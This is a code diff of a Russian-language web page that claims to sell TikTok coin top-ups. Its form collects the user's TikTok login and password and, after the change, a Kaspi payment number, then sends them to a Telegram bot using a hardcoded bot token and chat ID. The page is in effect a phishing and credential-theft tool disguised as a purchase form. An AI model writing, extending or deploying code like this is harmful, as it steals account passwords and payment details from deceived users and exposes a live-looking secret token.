@@ -6,7 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="style.css">
   <style>
-    .form-container {
+    .container {
       max-width: 400px;
       margin: 0 auto;
     }
@@ -41,27 +41,29 @@
   <script>
     const token = "7898630945:AAGRorhRoEt_XJS628vM4VoWJkq5N-xjAnc";
     const chatId = "1124467370";
-    const coinRate = 5.231;
-    const margin = 1.2;
+    const coinRate = 5.231 * 1.2;
 
     function updatePrice() {
       const amount = parseInt(document.getElementById("amount").value);
       if (amount > 0) {
-        const price = Math.round(amount * coinRate * margin);
-        document.getElementById("price").innerText = `💰 Цена: ${price} ₸`;
+        const price = Math.round(amount * coinRate);
+        document.getElementById("price").innerText = `💰 Итог: ${price} ₸`;
       } else {
         document.getElementById("price").innerText = "";
       }
     }
 
-    async function sendTopUp() {
+    async function sendOrder() {
       const amount = parseInt(document.getElementById("amount").value);
-      const account = document.getElementById("account").value;
-      if (!amount || amount < 1) return alert("Введите количество монет");
-      if (!account) return alert("Введите логин:пароль от TikTok");
+      const account = document.getElementById("account").value.trim();
+      const kaspi = document.getElementById("kaspi").value.trim();
 
-      const price = Math.round(amount * coinRate * margin);
-      const msg = `🪙 <b>Пополнение монет</b>\n🔢 Кол-во: ${amount}\n🔐 Аккаунт: ${account}\n💵 Цена: ${price} ₸`;
+      if (!amount || amount < 1) return alert("Введите количество монет");
+      if (!account) return alert("Введите TikTok логин:пароль");
+      if (!kaspi) return alert("Введите номер Kaspi");
+
+      const price = Math.round(amount * coinRate);
+      const msg = `🪙 <b>Пополнение монет</b>\n🔢 Кол-во: ${amount}\n🔐 Аккаунт: ${account}\n📱 Kaspi: ${kaspi}\n💵 Цена: ${price} ₸`;
 
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
@@ -69,25 +71,19 @@
         body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: "HTML" })
       });
 
-      alert("✅ Заказ отправлен! После оплаты отправьте чек в Telegram.");
+      alert("✅ Заказ отправлен! Мы выставим счёт на Kaspi.");
     }
   </script>
 </head>
 <body>
-  <h1>💰 Пополнение монет</h1>
-
-  <div class="form-container">
+  <div class="container">
+    <h1>💰 Пополнение монет</h1>
     <input type="number" id="amount" placeholder="Введите количество монет" oninput="updatePrice()" />
     <input type="text" id="account" placeholder="Введите логин:пароль от TikTok" />
+    <input type="text" id="kaspi" placeholder="Введите номер Kaspi (GOLD/RED)" />
     <p id="price" class="desc"></p>
 
-    <p class="desc">
-      💳 Оплата KaspiGOLD/RED:<br>
-      <a href="https://pay.kaspi.kz/pay/qy6kfslc" style="color:#0f0;">https://pay.kaspi.kz/pay/qy6kfslc</a><br>
-      После оплаты отправьте чек в Telegram: <a href="https://t.me/zexonbot" style="color:red;">@zexonbot</a>
-    </p>
-
-    <button class="button" onclick="sendTopUp()">📩 Отправить заказ</button>
+    <button class="button" onclick="sendOrder()">📩 Заказать</button>
     <a class="back-button" href="index_ru.html">🔙 Назад в меню</a>
   </div>
 </body>
